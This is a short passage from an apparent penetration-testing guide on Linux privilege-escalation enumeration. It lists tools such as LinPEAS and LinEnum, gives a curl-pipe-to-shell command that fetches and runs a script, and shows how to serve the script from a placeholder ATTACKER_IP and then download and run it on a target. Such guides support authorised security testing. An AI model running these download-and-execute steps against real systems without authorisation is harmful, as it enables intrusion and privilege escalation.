# Phase 2: Automated Enumeration

Deploy automated scripts for comprehensive enumeration:

```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# Linux Smart Enumeration
./lse.sh -l 1

# Linux Exploit Suggester
./les.sh
```

Transfer scripts to target system:

```bash
# On attacker machine
python3 -m http.server 8000

# On target machine
wget http://ATTACKER_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```